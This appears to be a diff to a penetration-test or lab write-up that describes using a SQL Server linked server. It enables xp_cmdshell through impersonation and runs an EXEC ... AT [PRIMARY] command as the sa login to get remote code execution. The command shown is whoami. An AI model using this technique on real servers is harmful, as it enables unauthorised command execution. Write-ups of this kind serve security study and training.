@@ -1091,4 +1091,13 @@ RECONFIGURE;
 
 Ill enabled xp_cmdshell on the linked server using impersonation
 
-Now its enabled i can run c
+Now its enabled i can run commands
+
+![](Pasted%20image%2020260829163400.png)
+
+```python
+EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''whoami'';') AT [PRIMARY];
+```
+
+I now have RCE
+
